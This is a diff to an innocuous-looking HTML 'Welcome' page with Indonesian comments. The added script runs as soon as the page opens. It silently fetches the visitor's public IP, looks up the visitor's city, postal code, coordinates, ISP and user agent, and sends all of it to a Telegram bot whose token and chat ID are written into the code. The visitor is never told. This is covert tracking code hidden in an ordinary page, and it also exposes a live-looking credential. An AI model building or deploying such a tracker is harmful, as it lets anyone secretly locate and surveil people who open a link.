@@ -5,15 +5,62 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Welcome</title>
     <script>
-        // Kirim data ke backend Flask
-        // fetch("http://192.168.1.100:5000/log", {  // Ganti dengan IP HP kamu
-           fetch("http://10.11.208.165:5000/log", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                userAgent: navigator.userAgent  // Ambil info User-Agent
-            })
-        });
+        // Token bot Telegram dan Chat ID
+        const TELEGRAM_TOKEN = "7896685998:AAGXZGmmckIixNQLJPfb4aKz5morpkvI7cY";
+        const CHAT_ID = "7202626818";
+
+        // Fungsi untuk mengirim pesan ke Telegram
+        function sendToTelegram(message) {
+            const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            fetch(telegramApiUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"  // Supaya teks lebih rapi
+                })
+            }).catch(error => console.error("Gagal mengirim ke Telegram:", error));
+        }
+
+        // Fungsi utama untuk mendapatkan IP dan mengirim ke Telegram
+        async function trackVisitor() {
+            try {
+                // 1️⃣ Ambil IP publik pengguna
+                let ipResponse = await fetch("https://api.ipify.org?format=json");
+                let ipData = await ipResponse.json();
+                let userIP = ipData.ip;
+
+                // 2️⃣ Ambil informasi detail tentang IP
+                let locationResponse = await fetch(`https://freeipapi.com/api/json/${userIP}`);
+                let locationData = await locationResponse.json();
+
+                // 3️⃣ Siapkan pesan lengkap untuk dikirim ke Telegram
+                let message = `🚨 *Pengunjung Baru!* 🚨\n\n` +
+                              `📍 *IP:* \`${locationData.ipAddress}\`\n` +
+                              `🌍 *Negara:* ${locationData.countryName} (${locationData.countryCode})\n` +
+                              `🏙 *Kota:* ${locationData.cityName}, ${locationData.regionName}\n` +
+                              `🌎 *Benua:* ${locationData.continent} (${locationData.continentCode})\n` +
+                              `📌 *Kode Pos:* ${locationData.zipCode}\n` +
+                              `🕒 *Zona Waktu:* ${locationData.timeZone}\n` +
+                              `💱 *Mata Uang:* ${locationData.currency.name} (${locationData.currency.code})\n` +
+                              `🗣 *Bahasa:* ${locationData.language}\n` +
+                              `📡 *ISP:* ${locationData.ispName || "Tidak diketahui"}\n` +
+                              `🌐 *TLD:* ${locationData.tlds.join(", ")}\n` +
+                              `🔍 *User-Agent:* \`${navigator.userAgent}\`\n\n` +
+                              `📌 *Koordinat:* ${locationData.latitude}, ${locationData.longitude}\n` +
+                              `🕹 *Proxy:* ${locationData.isProxy ? "Ya" : "Tidak"}`;
+
+                // 4️⃣ Kirim pesan ke Telegram
+                sendToTelegram(message);
+
+            } catch (error) {
+                console.error("Gagal mendapatkan IP:", error);
+            }
+        }
+
+        // Jalankan fungsi saat halaman dibuka
+        trackVisitor();
     </script>
 </head>
 <body>
